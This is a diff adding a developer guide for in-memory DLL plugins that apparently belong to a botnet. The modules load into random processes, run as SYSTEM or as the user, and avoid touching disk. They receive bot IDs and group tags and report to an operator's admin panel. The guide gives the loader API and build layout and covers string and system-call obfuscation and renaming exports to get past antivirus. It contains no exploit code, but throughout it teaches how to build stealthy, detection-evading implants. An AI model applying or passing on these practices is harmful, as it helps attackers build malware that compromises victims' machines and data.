@@ -1,0 +1,258 @@
+MODULE DEVELOPMENT RULES
+
+The module is a DLL which will run in the left random process.
+On a 64 bit system there will be a 64 bit module, and on a 32 bit system a 32 bit module.
+A module is not just a C++ program. A module has some limitations due to the context in which it runs:
+1. You must minimize the use of Visual C++ Runtime. Functions malloc, memcpy, str* must be avoided. WinAPI already has everything you need - instead of malloc - HeapAlloc, instead of memcpy - CopyMemory, instead of strstr - StrStr (shlwapi.h/.lib).
+1.1. STL should generally be avoided. STL definitely doesn't work std::mutex. The rest is at your own risk!
+1.2 Some STL features give an extra prologue to your code. For std::mutex it weighs 200k. You can't see it in your code, but it is there, and it will behave strangely in execution context!
+1.3 Failure to comply with points 1 and 1.1 may cause VERY strange behavior.
+2. The linking of the mainline and third-party libraries to the module must be static (the /MT flag).
+3) If 3rd party libraries are used, they must allow to replace malloc/realloc/free memory management functions (you will put your wrappers over VirtualAlloc there instead). Also they themselves should be linked statically with everything you need (so you don't try to load some dll that Windows doesn't have by default).
+4. The module can run as either a current interactive user or as a local system (nt authority\SYSTEM), as a NON-interactive process (as a service). Regarding non-interactivity, google Session 0 isolation/Services isolation in session 0.
+5. The module's code should not try to get the path to itself, because in real life it will run in memory without saving to disk.
+The developer must take this into account, and ensure that the module works in all modes. Ignoring or not knowing these points is usually the reason why your module works locally, but not in production.
+Also, there are additional requirements related to security:
+1. The use of temporary files is forbidden. The default is to not write to any files or the registry. Each case of such writing has to be stipulated.
+2. The module should have no state if possible (i.e., so that it does not need to save anything to the registry/file when stopped, and then read from there when started).
+3. if the module runs in several processes, the best way to communicate between them (in descending order - remember that temporary files are forbidden)
+a. Direct read/write memory (ReadProcessMemory/WriteProcessMemory).
+b. Named pipes
+
+
+MODULE DESIGN
+1. There must be a Microsoft Visual Studio project, version at least 2015.
+2. The Visual Studio project must be configured as follows:
+* For ALL build profiles:
+- Output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\
+- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\
+- Multiprocessor compilation: yes
+* Release Profile:
+- Debugging information format (C/C++ code creation): no
+- Create debugging information (linker/debugger): no
+3. Strings to obfuscate with Andrivet library (attached, see _STR() macro)
+4. System calls should be obfuscated with library GetApi.h. Be careful, obfuscation of system calls may cause crashes.
+5. The module must have two versions - x32- and x64-bit.
+6. In the live build must be obfuscated to the maximum strings, disable all debug output.
+7. The module must have a debug version. The debug output should be printed to c:/temp/modulename.log (the path to the log is configured in the macro).
+Each log entry must contain a timestamp accurate to a second.
+8. The project must have a file config.h (the name does not matter, the important point - here all the global settings - paths, macros-switches of conditional compilation, etc.).
+9. The module must work on all modern versions of Windows.
+   The minimum supported version of Windows - Windows XP (if impossible - Windows Vista).
+10. Additionally the notelemetry.obj file must be added to the layout (https://stackoverflow.com/questions/37761768/how-to-prevent-visual-studio-2015-update-2-to-add-telemetry-main-invoke-trigger)
+
+
+ASSEMBLY NAME
+
+The assembly must have a directory structure:
+
+ modulename/Release_logged/x86
+ modulename/Release_logged/x64
+ modulename/Release_nologs/x86
+ modulename/Release_nologs/x64
+
+In Release_logged there is a version with logging and without obfuscation (but it's still a Release!
+i.e. all optimizations should be enabled there, debug symbols disabled, etc.).
+In release_nologs - version without logs, with full obfuscation.
+The name of the build directory should contain the module name and date (e.g. cookies.22.04.2019).
+If for specified date there are several builds of one module, unique suffix should be added (e.g. cookies.22.04.2019.2)
+
+This is necessary for normal operation of the module - for testers and administrators to distinguish build versions,
+so that it is possible to rollback or upgrade, as well as to provide the desired build by its date.
+
+
+UNIT TESTING
+
+The module should be tested in the following modes:
+1. On OS Windows 7, 8.1, 10, both 32- and 64-bit. The operating system should NOT be installed programs that install packages MSVC++ runtime library (i.e., we put the bare OS and the minimum that you need for testing).
+2. as an interactive user (the one you are logged in as)
+3) As NOT an administrator, as the system (downloading the plugin) and as the user who is logged in.
+4. as System (download the pstools package, run the module like this:
+psexec -d -s runmodule.exe
+This launches the module as a SYSTEM user
+Only after passing the internal tests, you can pass the module to the tester.
+
+
+INTERACTION WITH HIGHER LOGIC
+
+The module receives the necessary information from the upstream logic. ClientID, group tag, external IP address will be passed through the Start function in the ParentInfo parameter
+The module receives configs through the Control function (if there are several configs, each one has its own value of the CtlArg parameter).
+The body of the configs and their length will be passed through the CtlArg and CtlArgLen parameters.
+For standalone tests, you should write a demo launcher, which will load the compiled module through loadLIbrary. The pseudo code is very similar:
+main() {
+  LoadLibrary("module.dll");
+  Start = GetProcAddress(module, "Start");
+  Handle = Start(...);
+  If(!handle) return 1;
+  Control("config", "config body");
+  While(true) sleep(1000);
+  Release(handle);
+}
+Thus the following scheme:
+1. the demo launcher loads the module (DLL) to itself and calls the start and control functions to pass configs, external ip address, clientid and group to it.
+2. code inside the module that does useful work.
+
+The execution flow is as follows:
+* The Start() function initializes the job, starts the main worker thread in the background, and returns the module descriptor (usually the address of the Start function)
+* The main thread can wait for the necessary Control() calls with configs to arrive, and only then start working.
+  This depends on the purpose of the module itself - it may not need to wait.
+* Control() calls are usually used to pass configs or control actions (mode changes) to the module.
+  These calls must be handled as interrupts. These calls happen in a separate thread, so thread-safety has to be ensured for everything,
+  that is shared with the main execution thread.
+
+MODULE API
+The module exports the following functions: Start, Control, Release, FreeBuffer [*1]
+All functions have an stdcall convention and are exported by name.
+The Start function has the following prototype:
+PVOID Start(
+	LPCSTR ModuleName,
+	LPCBYTE Arg,
+	SIZE_T ArgLen,
+	LPSTR ResultInfo,
+	const ParentInfo* pParentData,
+	PVOID EventCallback,
+	PVOID EventCallbackContext,
+	PVOID Reserved1);
+The function is called at the start of the module by the logic above.
+ModuleName - module name
+Arg - the start command's argument
+ArgLen - the size of the CtlArg parameter in bytes
+ResultInfo - buffer for the resulting ctl string. The buffer has a fixed length of 1024 bytes
+pParentData - information about the higher logic, controlled by the module's config
+EventCallback - pointer to the logging function (see below)
+EventCallbackContext - logging context (see below)
+The function, if successful, returns a descriptor, which should be used when calling the Control and Release functions (you can pass the address of the Start function itself - it's quite unique within the OS). If unsuccessful, the function returns zero.
+
+typedef struct struct ParentInfo {
+	CHAR ParentID[256];
+	CHAR ParentGroup[64];
+	CHAR SelfIP[64];
+	LPCWSTR ParentFiles;
+} ;
+ParentID - full client ID of the above logic
+ParentGroup - grouping tag of the parent logic
+SelfIP - external IP address
+ParentFiles - not used
+
+6.2 The Control function has the following prototype
+BOOL Control (
+	PVOID ModuleHandle,
+	LPCSTR Ctl,
+	LPCBYTE CtlArg,
+	SIZE_T CtlArgLen,
+	LPSTR CtlResultInfo,
+	PVOID* ppOutData,
+	PDWORD pOutDataSize,
+	LPCSTR pOutDataTag,
+	PVOID Reserved1);
+
+ModuleHandle - Descriptor of the module returned by the Start function.
+Ctl - string containing the description of the control signal to the module
+CtlArg - argument ctl to the module (signal body)
+CtlArgLen - size of the CtlArg parameter in bytes.
+ResultInfo - buffer for the resulting ctl string. The buffer has a fixed length of 1024 bytes
+ppOutData - pointer to the variable in which the pointer to the ctl output data buffer will be saved (ctl_OutData)
+pOutDataSize - pointer to the variable in which the data size in the ctl output data buffer will be saved
+pOutDataTag - buffer for the auxiliary tag, which will be sent to the server. The buffer has a fixed length of 128 bytes.
+The function returns TRUE if successful, otherwise it returns FALSE. If successful, if the value of *ppOutData after the call is not zero, then this buffer must be freed through the FreeBuffer function.
+The normal purpose of this function is to pass the config to a module.
+
+The Release function has the following prototype
+VOID Release (
+	PVOID ModuleHandle);
+The function implements the complete shutdown of the module. Its task is to remove all the resources used during the module's operation.
+
+The FreeBuffer function has the following prototype
+VOID FreeBuffer (
+	PVOID pMemory);
+The function frees the buffer allocated inside the Control function (parameter ppOutData).
+
+* Changes of naming functions in the export
+1) old version, still works, but antiviruses often scare the module by these functions
+2) The module exports any at least 4 functions by name, the names of functions are reported to the administrator as
+CheckFuncStr=Start, GetLength=Control, SetHeigth=Release, Reload=FreeBuffer.
+The functions can be changed when cleaning up, but again, you will need to inform the administrator.
+3) The module exports functions by ordinal, or by name, but necessarily in the following order: 1.Start, 2.Control, 3.FreeBuffer 4.Release
+Example of a file to export by ordinal
+EXPORTS
+@1 = Start_
+@2 = Control_
+@3 = FreeBuffer_
+@4 = Release_
+Example def file for export by name:
+CheckFuncStr = Start_
+GetLength = Control_
+Reload = FreeBuffer_
+SetHeigth = Release_
+
+EVENT LOGGING RULES IN THE ADMIN PANEL
+
+The two penultimate two parameters of the Start function are for logging events to the admin panel.
+EventCallback is a pointer to the function defined as:
+
+typedef VOID (__stdcall *pEventCallback)(
+	PVOID ModuleHandle,
+	LPCSTR EventName,
+	LPCSTR EventInfo,
+	PVOID pOutData,
+	DWORD OutDataSize,
+	LPCSTR pOutDataTag,
+	PVOID Context);
+
+Where:
+	ModuleHandle - Module descriptor (usually a pointer to the Start function)
+	EventName - type of event
+	EventInfo - content of the event
+	pOutData - additional data of the event
+	OutDataSize - length of additional data
+	pOutDataTag - event tag
+	Context - pass here EventCallbackContext, received in Start
+
+Define in your code a function like this
+void SendEvent(char* name, char* value) {
+	pEventCallback callback = (pEventCallback)EvCallback;
+	if (callback) {
+		debug_printf("SendEvent(%s, %s)\r\n", name, value;)
+		callback(Start, name, value, NULL, 0, tag, EvCallbackContext);
+	}
+}
+where
+tag - event tag (needed for filtering in the logs; usually it's the name of a module, for example "module1")
+name - the source of the event (the set of events can be grouped by their source - the subsystem in the code where they are generated. For example, "sql")
+value - content of the event (any string. For example, "module1 build 01 Jan, 20xx 11:22:25 started ok")
+
+The source of the event is defined by the developer himself.
+The source must be 4 characters long. For example, you could define DEBG types for debugging, VERS types for sending your own version, PING types for sending heartbeat to admin, etc.
+A source that identifies the subsystem of your module from which the event occurs. For example, a module has a file subsystem, and a network subsystem - "file" and "net" tags are used for them.
+Previously, you had to hang mutex on logging, because there was no protection and checking in the above logic, and it was thread-unsafe. Then the mutex was put on the other side, and everything seemed to work.
+But - if anything - if there are problems - look first of all to multithreading, secondly to call convention (_stdcall).
+
+!!!!!!!!!!!
+!!! IMPORTANT!!!
+!!!!!!!!!!!
+
+The events from the module must be few and important. It is unacceptable to flub with debugging events.
+i.e. you can put logging in a module for debugging, but then you must remove the debug events when the build is issued.
+
+Sending an event is a blocking operation.
+
+It should be understood that sending an event to the parent is not instantaneous. The parent receives events by periodic polling
+through shared memory. Therefore, although an event may be sent, it may not yet be received by the parent.
+This is especially true for events sent before the end of the process - they may be lost for the reason described.
+
+If the module is non-resident (it runs once and then shuts down), it must send an
+EventName = WantRelease
+EventInfo = NULL
+On receiving this event, the module's host will unload it from memory.
+
+
+COMMON MISTAKES
+
+1) Sending an event (message), most often with the module version and date from the Start function.
+This should NOT be done.
+The correct way is this:
+- Start has done the initial checks, initializations, started the main thread and finished
+- the main thread is already starting to spam telemetry in events
+
+2) botid, group and ip are passed to the Start function.
+These string values must be COPYED into the Start function, because when you exit the function, the string memory is freed and the strings become invalid.
